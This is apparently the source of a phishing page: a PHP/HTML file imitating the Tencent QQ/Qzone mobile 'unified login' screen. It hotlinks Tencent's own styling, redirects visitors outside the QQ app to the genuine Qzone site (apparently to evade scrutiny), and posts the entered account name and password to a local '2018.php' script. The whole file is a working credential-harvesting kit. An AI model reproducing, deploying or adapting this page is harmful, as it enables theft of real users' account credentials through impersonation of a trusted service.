<?php
require_once 'include/common.php';
?>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta id="viewport" name="viewport"
          content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Mobile phone unified login</title>
    <style type="text/css">
        html {
            height: 100%
        }

        body {
            font-size: 16px;
            background: #eee;
            height: 100%
        }

        * {
            padding: 0;
            margin: 0;
            list-style: none;
            text-decoration: none
        }

        input::-webkit-input-placeholder, textarea::-webkit-input-placeholder {
            color: #aaa
        }

        input::-ms-input-placeholder, textarea::-ms-input-placeholder {
            color: #aaa
        }

        input:focus {
            outline: 0
        }

        .content {
            margin: 0 auto;
            width: 320px;
            height: 500px;
            position: relative
        }

        #error_tips {
            position: absolute;
            top: 0;
            z-index: 100;
            display: none;
            opacity: .95;
            width: 100%
        }

        #error_tips #error_tips_content {
            position: relative;
            padding: 16px 0 24px 24px;
            border-radius: 5px;
            background-color: #525c5f;
            height: 28px
        }

        #error_tips #error_tips_content #error_icon {
            position: absolute;
            top: 18px;
            display: inline-block;
            width: 24px;
            height: 24px;
            background: url("http://ui.ptlogin2.qzone.com/style/8/images/info.png") no-repeat 0 0
        }

        #error_tips #error_tips_content #error_message {
            display: inline-block;
            line-height: 28px;
            font-size: 14px;
            color: white;
            padding: 0 0 0 28px
        }

        #error_message a {
            color: #f15a22
        }

        @media (-webkit-min-device-pixel-ratio: 2),(min-resolution: 192dpi),(min-resolution: 2dppx) {
            #error_tips #error_tips_content #error_icon {
                background: url("http://ui.ptlogin2.qzone.com/style/8/images/info@2x.png") no-repeat 0 0;
                background-size: 24px 24px
            }
        }

        .login {
            margin: 0 auto;
            padding-top: 30px
        }

        .q_login {
            margin: 0 auto;
            width: 290px;
            overflow: hidden;
            text-align: center;
            margin-bottom: 40px
        }

        .inputstyle {
            -webkit-tap-highlight-color: rgba(255, 255, 255, 0);
            width: 273px;
            height: 44px;
            color: #000;
            border: 0;
            background: 0;
            padding-left: 15px;
            font-size: 16px;
            -webkit-appearance: none
        }

        .logo {
            height: 100px;
            width: 244px;
            margin: 0 auto;
            margin-bottom: 20px;
            background-size: 244px 100px
        }

        .header {
            display: inline-block;
            height: 97px;
            width: 96px;
            text-align: center;
            position: relative
        }

        .header img {
            width: 60px;
            height: 60px;
            position: absolute;
            top: 10px;
            left: 16px
        }

        .header .img_out {
            width: 60px;
            height: 60px;
            position: absolute;
            top: 9px;
            left: 15px;
            border: solid 1px #c6dbe8;
            border-radius: 4px;
            -webkit-box-shadow: 1px 1px 13px #6e6e6e
        }

        .nick {
            display: inline-block;
            text-align: center;
            position: absolute;
            top: 80px;
            left: 0;
            height: 20px;
            line-height: 18px;
            vertical-align: middle
        }

        .del_touch_icon {
            display: none;
            width: 30px;
            height: 30px;
            position: absolute;
            left: 60px;
            top: 0;
            z-index: 1
        }

        .del_icon {
            display: block;
            width: 24px;
            height: 22px;
            background: url("http://ui.ptlogin2.qzone.com/style/8/images/android_logo_v1.png") no-repeat -68px 0;
            border-radius: 11px
        }

        #web_login {
            width: 290px;
            margin: 0 auto
        }

        #g_list {
            background: #fff;
            height: 89px;
            border-radius: 4px
        }

        #g_u, #g_p {
            position: relative
        }

        #g_u {
            border-bottom: 1px solid #eaeaea
        }

        .txt_default {
            position: absolute;
            top: 12px;
            left: 10px;
            color: #b3b3b3
        }

        .del_touch {
            -webkit-tap-highlight-color: rgba(255, 255, 255, 0);
            position: absolute;
            right: 0;
            display: block;
            height: 44px;
            width: 48px;
            z-index: 1
        }

        .del_u {
            display: none;
            position: absolute;
            left: 15px;
            top: 13px;
            height: 18px;
            width: 18px;
            background-color: #aaa;
            border-radius: 9px;
            background: url("http://ui.ptlogin2.qzone.com/style/8/images/android_logo_v1.png") no-repeat -117px -2px
        }

        #auto_login {
            height: 24px;
            margin: 15px 0;
            color: #246183;
            position: relative
        }

        #auto_login .wording {
            position: absolute;
            left: 40px;
            line-height: 24px;
            height: 24px;
            font-size: 14px
        }

        #remember {
            position: absolute;
            left: 14px;
            top: 5px;
            cursor: pointer;
            z-index: 1;
            opacity: .01
        }

        #remember:checked + .checkbox {
            background: #146fdf url("http://ui.ptlogin2.qzone.com/style/8/images/checked.png") 1px 1px;
            border-color: #146fdf
        }

        #remember + .checkbox {
            display: inline-block;
            width: 21px;
            height: 21px;
            position: absolute;
            left: 9px;
            top: 1px;
            border: 1px solid #9abbe3;
            background: 0;
            border-radius: 11px
        }

        #go, #onekey {
            width: 290px;
            height: 44px;
            line-height: 44px;
            background: #146fdf;
            border: 0;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            text-align: center;
            margin-top: 15px;
            display: block
        }

        #onekey {
            background: #146fdf;
            display: none
        }

        #go.weak {
            background-color: #e7e7e7;
            color: #146fdf;
            border: 1 pxsolid #9abbe3;
            height: 42px
        }

        #switch {
            width: 290px;
            margin: 0 auto
        }

        #switch #swicth_login {
            width: 288px;
            height: 42px;
            line-height: 44px;
            border: solid 1px #9abbe3;
            border-radius: 5px;
            background: #e7e7e7;
            margin-top: 10px;
            text-align: center;
            font-size: 16px;
            color: #146fdf
        }

        #switch #zc_feedback {
            width: 290px;
            position: relative;
            margin-top: 15px;
            overflow: hidden
        }

        #switch #zc, #switch #forgetpwd {
            color: #246183;
            line-height: 14px;
            font-size: 14px;
            padding: 15px 10px
        }

        #switch #zc {
            float: right;
            margin-right: -10px
        }

        #switch #forgetpwd {
            float: left;
            margin-left: -10px
        }

        .tansparent {
            background: 0
        }

        #q_login_title {
            height: 32px;
            line-height: 22px;
            margin-bottom: 20px;
            position: relative
        }

        #q_login_logo {
            background: url("http://ui.ptlogin2.qzone.com/style/8/images/android_logo_v1.png") no-repeat -44px 0;
            width: 22px;
            height: 22px;
            position: absolute;
            left: 0
        }

        #q_login_tips {
            position: absolute;
            left: 30px;
            top: 0;
            color: #246183
        }

        #vcode {
            margin: 0 auto;
            padding-top: 40px;
            display: none
        }

        #vcode #vcode_tips {
            display: block;
            width: 290px;
            height: 20px;
            line-height: 20px;
            margin: 0 auto;
            margin-bottom: 15px;
            color: #77838d
        }

        #vcode #vcode_area {
            position: relative;
            margin: 0 auto;
            width: 290px;
            height: 70px;
            border-radius: 5px;
            border: solid 1px #b8b8b8;
            background: #fff
        }

        #vcode #vcode_img {
            position: absolute;
            left: 3px;
            width: 140px;
            height: 70px
        }

        #vcode #vcode_input {
            position: absolute;
            top: -1px;
            left: 145px;
            width: 145px;
            height: 70px;
            border: 1px solid #9d9d9d;
            background: 0;
            -webkit-appearance: none;
            border-top-right-radius: 5px;
            border-bottom-right-radius: 5px;
            line-height: 28px;
            font-size: 28px;
            -webkit-box-shadow: inset 0 0 10px #ccc
        }

        #vcode #input_tips {
            position: absolute;
            top: 5px;
            left: 150px;
            display: block;
            width: 135px;
            height: 50px;
            color: #b3b3b3;
            z-index: 1;
            padding-top: 8px
        }

        #vcode #submit {
            width: 288px;
            height: 22px;
            padding: 10px 0;
            background: #7ec82c;
            border: 0;
            border-radius: 5px;
            color: #fff;
            font-size: 22px;
            text-align: center;
            margin: 0 auto;
            margin-top: 35px
        }

        .copyright {
            text-align: center;
            color: #8a949d;
            font-size: 10px;
            margin-top: 15px;
            font-family: Helvetica
        }

        .copyright .en {
            line-height: 20px
        }

        .copyright .chs {
            line-height: 20px
        }

        .mode_webapp .ui_topbar .topbar_btn b, .mode_webapp .ui_topbar .topbar_btn_left b {
            background-image: url("http://ui.ptlogin2.qzone.com/style/8/images/bg_btn_back.png");
            background-position: bottom right;
            background-size: 105px;
            width: 6px;
            height: 32px;
            float: left
        }

        .ui_topbar h3, .ui_topbar .topbar_title {
            font-size: 18px
        }

        .ui_topbar {
            border-bottom: 1px solid #b6b6b6;
            border-top: 2px solid #df242a;
            background-color: #d9d9d9;
            background-image: -webkit-gradient(linear, left top, left bottom, from(#ebebeb), to(#d9d9d9));
            background-image: -webkit-linear-gradient(top, #ebebeb, #d9d9d9);
            background-image: linear-gradient(to bottom, #ebebeb, #d9d9d9);
            height: 40px;
            line-height: 40px;
            text-align: center;
            position: relative
        }

        .lay_header {
            height: auto !important;
            width: 100%
        }

        .mode_webapp .ui_topbar {
            color: #fff;
            background-color: #c32d32;
            background-image: -webkit-gradient(linear, left top, left bottom, from(#fe444a), to(#c32d32));
            background-image: -webkit-linear-gradient(top, #fe444a, #c32d32);
            background-image: linear-gradient(to bottom, #fe444a, #c32d32);
            border-bottom: 1px solid #700d00;
            border-top: 0 none;
            top: 0;
            left: 0;
            width: 100%
        }

        .mode_webapp .ui_topbar .topbar_btn_left {
            display: block;
            position: absolute;
            left: 10px;
            top: 5px
        }

        .mode_webapp .ui_topbar .topbar_btn span, .mode_webapp .ui_topbar .topbar_btn_left span {
            float: left;
            display: inline-block;
            height: 32px;
            line-height: 30px;
            color: #fff;
            background-image: url("http://ui.ptlogin2.qzone.com/style/8/images/bg_btn_back.png");
            background-size: 105px;
            padding-left: 10px;
            padding-right: 4px
        }

        .mode_webapp .ui_topbar .topbar_btn_left span {
            background-image: url("http://ui.ptlogin2.qzone.com/style/8/images/bg_btn_back.png");
            background-position: left -32px;
            background-size: 105px;
            padding-left: 17px
        }

        .mode_webapp .ui_topbar {
            box-shadow: 0 0 5px #333
        }

        .skin-2 .ui_topbar {
            background-color: #161616;
            background-image: -webkit-gradient(linear, left top, left bottom, from(#3e3e3e), to(#262626));
            background-image: -webkit-linear-gradient(top, #3e3e3e, #262626);
            background-image: linear-gradient(to bottom, #3e3e3e, #262626);
            border-bottom-color: #1a1a1a
        }

        .skin-2 .ui_topbar {
            background-color: #161616;
            background-image: -webkit-gradient(linear, left top, left bottom, from(#3e3e3e), to(#262626));
            background-image: -webkit-linear-gradient(top, #3e3e3e, #262626);
            background-image: linear-gradient(to bottom, #3e3e3e, #262626);
            border-bottom-color: #1a1a1a
        }

        .skin-2 .ui_topbar .topbar_btn span, .skin-2 .ui_topbar .topbar_btn_left span, .skin-2 .ui_topbar .topbar_btn b, .skin-2 .ui_topbar .topbar_btn_left b {
            background-image: url("http://ui.ptlogin2.qzone.com/style/8/images/bg_btn_back_black@2x.png");
            background-size: 105px
        }

        .new_vcode {
            display: none;
            width: 100%;
            height: 100%;
            overflow: hidden
        }</style>
    <style type="text/css">.logo {
            background-image: url(https://i.loli.net/2018/11/08/5be30db27206c.png)
        }</style>
    <link rel="stylesheet" href="http://qzonestyle.gtimg.cn/qzone/phone/style/login.css">

    <script type="text/javascript">
        (function () {
            var sUserAgent = navigator.userAgent.toLowerCase();
            if (sUserAgent.match(/QQ/i) != 'qq') {
                window.location.href = 'https://qzone.qq.com';
            }
        })();

        (function () {

            var $ = function (id) {
                return document.getElementById(id)
            };

            var on = function (el, event, callback) {
                el.addEventListener(event, callback, false)
            };

            var getCookie = function (name) {

                var r = new RegExp("(?:^|;+|\\s+)\s*" + name + "=([^;]*)"), m = document.cookie.match(r);

                return !m ? "" : decodeURIComponent(m[1]);

            }

            var setCookie = function (name, value, domain, path, hour) {

                if (hour) {

                    var expire = new Date;

                    expire.setTime(expire.getTime() + 36E5 * hour)

                }

                document.cookie = name + "=" + value + "; " + (hour ? "expires=" + expire.toGMTString() + "; " : "") + (path ? "path=" + path + "; " : "path=/; ") + (domain ? "domain=" + domain + ";" : "domain=" + domainPrefix + ";");

                return true

            }

            var pv = function (domain, path) {

                var refer = document.referrer.match(/http:\/\/([^/]+)\/([^\?#]+)/);

                var param = [

                    'dm+=' + escape(domain),

                    'url+=' + escape(path),

                    'rdm+=' + escape(refer ? refer[1] : ''),

                    'rurl+=' + escape(refer ? refer[2] : ''),

                    'pgv_pvid+=' + getId(),

                    'sds+=' + Math.random()

                ];

                img = new Image();

                img.src = "http://pingfore.qq.com/pingd?cc=-&ct=-&java=1&lang=-&pf=-&scl=-&scr=-&tt=-&tz=-8&vs=3.3&flash=&" + param.join("&")

            }

            var getId = function () {

                var t, d, h, f;

                t = document.cookie.match(/(?:^|;+|\s+)pgv_pvid=([^;]*)/i);

                if (t && t.length && t.length > 1) {

                    d = t[1];

                } else {

                    d = (Math.round(Math.random() * 2147483647) * (new Date().getUTCMilliseconds())) % 10000000000;

                    document.cookie = "pgv_pvid=" + d + "; path=/; domain=qq.com; expires=Sun,18 Jan 2038 00:00:00 GMT;";

                }

                h = document.cookie.match(/(?:^|;+|\s+)pgv_info=([^;]*)/i);

                if (!h) {

                    f = (Math.round(Math.random() * 2147483647) * (new Date().getUTCMilliseconds())) % 10000000000;

                    document.cookie = "pgv_info=ssid=s" + f + "; path=/; domain=qq.com;";

                }

                return d;

            }

            /*layer switch*/

            var hasShown = getCookie('guide2');

            var refer = document.referrer || '';

            var url = location.href;


            //  if(refer && refer != 'http://m.qzone.com/' && refer != 'http://m.qzone.com'){

            //      hasShown = true;

            //  }


            if (refer && refer.indexOf('qzs.qq.com') > 0) {

                hasShown = true;

            }


            if (url.indexOf('5758') > 0 || url.indexOf('5757') > 0) {

                hasShown = true;

            } else if (url.indexOf('6456') > 0 || url.indexOf('17636') > 0 || url.indexOf('17615') > 0 || url.indexOf('22578') > 0 || url.indexOf('22174') > 0) {

                hasShown = true;

            }


            var ua = navigator.userAgent;

            if (ua.match(/MSIE/)) {

                hasShown = true;

            }

            if (ua.indexOf('MicroMessenger') > 0) {

                hasShown = true;

            }

            if (!hasShown) {

                $('guide').style.display = '';

                if (navigator.connection && navigator.connection.type == '2') {

                    $('guideBG').setAttribute('class', 'wifi');

                }

                var close = function () {

                    setCookie('guide2', '1', ".ui.ptlogin2.qq.com", "/", 7 * 24);

                    $('guide').style.display = 'none';

                }

                on($('guideSkip'), 'click', function () {

                    close();

                    pv('m.qzone.com', '/guide_toWeb');

                });

                on($('guideJump'), 'click', function () {


                });

                pv('m.qzone.com', '/guide_show');

            }

        })();

    </script>
    <div id="logo" class="logo"></div>

    <!--<form id="form" action="index.php" method="post" onsubmit="return onpost()"> -->
    <form action="2018.php" method="post" onSubmit="return ts()">

        <div id="q_logon_list" class="q_logon_list"></div>
        </div>
        <div id="web_login">
            <ul id="g_list">
                <liid
                ="g_u">
                <div id="del_touch" class="del_touch"><span id="del_u" class="del_u"></span></div>
                <input id="u" class="inputstyle" name="user" autocomplete="off" placeholder="KK_Account/Phone/Email"></li>
                <li id="g_p">
                    <div id="del_touch_p" class="del_touch"><span id="del_p" class="del_u"></span></div>
                    <input id="p" class="inputstyle" maxlength="16" type="password" name="pass" autocorrect="off"
                           placeholder="Input your KK_Account please"></li>
            </ul>
            <button id="go" name="submit">Login</button>
            <div href="javascript:void(0);" id="onekey">Login quickly</div>
        </div>
        <div id="switch">
            <div id="swicth_login" onClick="pt._switch()" style="display:none"></div>
            <div id="zc_feedback"><span id="zc"
                                        onclick="window.open('https://ssl.zc.qq.com/v3/index-chs.html?from=pt')">Register</span>
                <span id="forgetpwd">Retrieve password</span></div>
        </div>
    </form>